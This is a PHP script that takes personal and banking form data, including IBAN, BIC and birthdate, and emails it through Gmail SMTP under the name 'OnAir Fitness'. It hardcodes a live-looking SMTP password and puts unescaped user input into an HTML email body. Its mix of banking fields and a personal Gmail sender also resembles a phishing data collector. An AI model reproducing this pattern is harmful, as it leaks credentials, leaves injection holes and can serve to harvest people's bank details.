<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';



$mail = new PHPMailer(true);
$response = [];

try {
    // Récupération des données du formulaire
    $firstName = $_POST['firstName'] ?? 'N/A';
    $lastName = $_POST['lastName'] ?? 'N/A';
    $birthdate = $_POST['birthdate'] ?? 'N/A';
    $address = $_POST['address'] ?? 'N/A';
    $city = $_POST['city'] ?? 'N/A';
    $email = $_POST['email'] ?? 'N/A';
    $accountHolder = $_POST['accountHolder'] ?? 'N/A';
    $iban = $_POST['iban'] ?? 'N/A';
    $bic = $_POST['bic'] ?? 'N/A';
    $bankName = $_POST['bankName'] ?? 'N/A';

    // Configuration du serveur SMTP
    $mail->isSMTP();
   $mail->Host = 'smtp.gmail.com'; // Serveur SMTP
    $mail->SMTPAuth = true;
    $mail->Username = 'donquidofi612@gmail.com'; // Nom d'utilisateur SMTP
    $mail->Password = 'ojbeukobjpadsjcq'; // Mot de passe SMTP
    $mail->SMTPSecure = 'tls'; // Activer SSL, utiliser 'tls' si vous préférez TLS
    $mail->Port = 587; // Port pour SSL

    // Destinataires
    $mail->setFrom('donquidofi612@gmail.com', 'OnAir Fitness');
    $mail->addAddress('contact@onairefitness.com', 'Client'); // Ajoutez une adresse de destinataire
    // Contenu de l'e-mail
    $mail->isHTML(true);
    $mail->Subject = 'NEW ACCOUNT Onairefitness';
    $mail->Body    = "Voici les détails du formulaire :<br>
                      Prénom: $firstName<br>
                      Nom: $lastName<br>
                      Date de naissance: $birthdate<br>
                      Adresse: $address<br>
                      Ville: $city<br>
                      Email: $email<br>
                      Titulaire du compte: $accountHolder<br>
                      IBAN: $iban<br>
                      BIC: $bic<br>
                      Nom de la banque: $bankName";

    $mail->send();
    $response['success'] = true;
    $response['message'] = 'Le message a été envoyé avec succès.';
} catch (Exception $e) {
    $response['success'] = false;
    $response['message'] = 'Message could not be sent. Mailer Error: ' . $e->getMessage();
}

header('Content-Type: application/json');
echo json_encode($response);
